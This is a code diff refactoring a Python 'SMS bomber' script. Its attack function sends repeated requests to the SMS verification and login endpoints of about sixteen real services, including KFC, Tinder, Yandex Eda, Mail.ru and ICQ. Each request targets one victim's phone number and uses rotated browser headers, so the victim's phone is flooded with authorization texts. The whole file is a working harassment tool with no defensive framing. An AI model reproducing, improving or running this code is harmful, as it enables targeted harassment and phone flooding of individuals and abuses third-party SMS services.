@@ -1,6 +1,7 @@
 import random
 import requests
-import datetime
+from datetime import datetime
+
 
 
 # colours
@@ -10,6 +11,7 @@ bold      = '\033[1m'
 underline = '\033[4m'
 end       = '\033[0m'
 red       = '\033[91m'
+
 
 # headers for optimizing sms sent
 heads = [
@@ -34,13 +36,11 @@ heads = [
 	'Accept': '*/*'
 	},
 ]
-		   
-		 
- 
+
 
 def time(sent):
-	a = datetime.datetime.now()
-	time = (str(a.hour) + ':' + str(a.minute) + ':' +str(a.second))
+	a = datetime.now()
+	time = a.strftime("%H") + ':' + a.strftime("%M") + ':' + a.strftime("%S")
 	msg1 = f"{green}{bold}{str(sent)}{end} sms sent!"
 	msg2 = f"{green}{bold}{str(time)}{end}"
 	if int(sent) < 10:
@@ -56,155 +56,143 @@ def time(sent):
 		
 
 def attack(number, sms):
-	number_7 = str(7) + number
-	number_plus7 = str(+7) + number
-	number_8 = str(8) + number
+	number_7 = '7' + number
+	number_plus7 = '+7' + number
+	number_8 = '8' + number
 	sent = 0
+
+
 	print("-" * 33)
 	print(f"|  {green}{bold}  amount   {end} | {green}{bold}     time     {end} |")
 	print("-" * 33)
+
+
 	HEADERS = random.choice(heads)
 	while sent <= sms:
 		try:
 			requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/', headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'},headers=HEADERS) #headers = {}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
 			
 		try:
 			requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
 			sent += 1
 			time(sent)
-			if sent >= sms:
-				break
-		except:
+			if sent >= sms: break
+		except Exception:
 			pass
